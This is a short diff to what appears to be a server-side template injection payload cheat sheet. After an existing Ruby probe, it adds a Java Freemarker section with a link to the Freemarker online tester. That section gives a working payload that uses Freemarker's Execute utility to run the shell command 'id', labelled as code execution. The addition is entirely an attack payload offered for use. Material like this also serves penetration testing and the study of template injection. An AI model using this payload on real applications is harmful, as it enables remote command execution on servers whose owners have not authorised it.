@@ -43,3 +43,16 @@ Basic:
 ```ruby
 #{ 7 * 7 }
 ```
+
+## Java
+
+### Freemarker
+
+Link:[ https://try.freemarker.apache.org/](https://try.freemarker.apache.org/)
+
+Basic:
+
+```java
+// Code Execution — id:
+${"freemarker.template.utility.Execute"?new()("id")}
+```
